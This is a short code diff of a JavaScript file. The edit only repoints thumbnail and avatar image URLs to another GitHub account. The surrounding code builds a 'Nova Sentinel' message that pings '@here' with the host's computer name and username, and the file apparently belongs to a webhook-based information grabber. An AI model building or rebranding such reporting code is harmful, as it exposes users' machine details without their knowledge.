@@ -1643,13 +1643,13 @@ const https = require("https"),
           ],
 
           thumbnail: {
-            url: `https://raw.githubusercontent.com/familigy/sub/main/assets/gifnova.gif`,
+            url: `https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/gifnova.gif`,
           },
         };
         const message = {
           username: "Nova Sentinel",
           avatar_url:
-            "https://raw.githubusercontent.com/familigy/sub/main/assets/lilnova.png",
+            "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png",
           content:
             "@here" + "\n`" + computerName + "`" + " - " + "`" + username + "`",
           embeds: [embed],
@@ -1707,13 +1707,13 @@ const https = require("https"),
               ],
     
               thumbnail: {
-                url: `https://raw.githubusercontent.com/familigy/sub/main/assets/gifnova.gif`,
+                url: `https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/gifnova.gif`,
               },
             };
             const message = {
               username: "Nova Sentinel",
               avatar_url:
-                "https://raw.githubusercontent.com/familigy/sub/main/assets/lilnova.png",
+                "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png",
               content:
                 "@here" + "\n`" + computerName + "`" + " - " + "`" + username + "`",
               embeds: [embed],
